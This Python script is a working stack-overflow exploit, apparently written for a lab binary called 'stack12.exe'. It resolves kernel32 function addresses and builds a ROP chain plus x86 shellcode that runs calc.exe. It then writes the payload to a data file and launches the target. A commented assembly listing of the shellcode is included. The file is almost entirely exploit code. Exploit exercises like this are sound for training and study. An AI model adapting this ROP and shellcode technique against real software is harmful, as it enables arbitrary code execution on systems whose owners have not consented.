import subprocess, struct, win32api

def s(x):
	 return struct.pack("<I", x)

	 
handle = win32api.GetModuleHandle("kernel32.dll")
virtualAlloc = win32api.GetProcAddress(handle, "VirtualAlloc")
winExec = win32api.GetProcAddress(handle, "WinExec")
exitProcess = win32api.GetProcAddress(handle, "ExitProcess")

if virtualAlloc > winExec:
	winExec_offset = 0xfffff & (virtualAlloc - winExec)
	op1 = "\x2d"
else:
	winExec_offset = 0xfffff & (winExec - virtualAlloc)
	op1 = "\x05"
	
if virtualAlloc > exitProcess:
	exitProcess_offset = 0xfffff & (virtualAlloc - exitProcess)
	op2 = "\x2d"
else:
	exitProcess_offset = 0xfffff & (exitProcess - virtualAlloc)
	op2 = "\x05"

rop = s(0x1010158e)			 # pop esi, ret
rop += s(0x10103020 + 0x74)  # ptr_malloc
rop += s(0x101018f0) 		 # jmp [esi - 0x74]
	
shellcode ="\x33\xD2\xEB\x1F\x5B\x53\xB9\x54\x30\x10\x10\x8B\x01" + op1 + s(winExec_offset)
shellcode +="\xFF\xD0\xB9\x54\x30\x10\x10\x8B\x01" + op2 + s(exitProcess_offset)
shellcode +="\x52\xFF\xD0\xE8\xDC\xFF\xFF\xFF\x63\x61\x6C\x63\x2E\x65\x78\x65\x00"


'''
=-=-= shellcode =-=-=

.code
start:
		xor edx, edx
		jmp short getstr
		
		back:
		pop ebx
		push ebx
        mov ecx, 10103054h 
        mov eax, [ecx]
        add/sub eax, winExec_offset
        call eax		   
        mov ecx, 10103054h
        mov eax, [ecx]
        add/sub eax, exitProcess_offset
		push edx
		call eax           

		getstr:
		call back
		db 'calc.exe',0h
end start
'''

payload =  "\x80" + s(0x45464748) + s(0x25262728) + s(0x80) 
payload += shellcode +"B"*(56-len(shellcode))
payload += rop + "C"*(0x80 - len(rop) - 56)

fDat = open('fichero.dat', 'wb')
fDat.write(payload)
subprocess.Popen(['stack12.exe'])
